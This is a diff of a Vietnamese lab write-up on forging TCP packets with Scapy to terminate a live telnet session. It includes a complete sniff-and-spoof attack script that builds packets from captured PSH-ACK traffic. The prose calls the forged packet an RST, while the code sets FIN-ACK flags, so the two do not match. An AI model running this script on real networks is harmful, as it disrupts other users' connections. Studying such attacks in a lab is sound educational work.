@@ -277,4 +277,25 @@ sniff(iface="br-96b833532993", store=False, filter="tcp and port 23", prn=attack
 		```
 ### Attack
 Từ các thông tin trên, ta có thể thực hiện attack tự động để kết thúc 1 kết nối telnet đang hoạt động như sau:
-- Ta sẽ sniff các gói ACK, ta giữ nguyên source IP, destination IP, source port, destination port, sequence number và ack number. Ta set flags là `FA` và IP Len là `52`. Sau khi gửi, ta chờ để nhận gói `FA` và phản hồi lại gói `FA` này bằng 1 gói ACK với `seq` bằng `seq` của gói `FA` và `ack` bằng `seq` của gói `FA` cộng 1.
+- Ta sẽ sniff các gói PSH-ACK, đổi chiều source/destination IP và port.
+- `seq` của gói RST sẽ bằng `ack` của gói PSH-ACK.
+- `ack` của gói RST sẽ bằng `seq` của gói PSH-ACK + độ dài payload của gói PSH-ACK (`IP.len - 52`).
+- Các trường còn lại như `window`, `chksum` sẽ được tính tự động hoặc sử dụng giá trị mặc định của `scapy`.
+
+- Attack script:
+```python
+#! /bin/python3
+from scapy.all import *
+
+
+def attack(packet):
+    if packet[TCP].flags == 'PA':
+        ip = IP(src=packet[IP].dst, dst=packet[IP].src)  
+        next_ack = packet[TCP].seq + packet[IP].len - 52
+        tcp = TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, seq=packet[TCP].ack, ack=next_ack, flags='FA')
+        reset_pkt = ip / tcp
+        send(reset_pkt)
+
+
+sniff(iface="br-96b833532993", store=False, filter="tcp and port 23", prn=attack)
+```
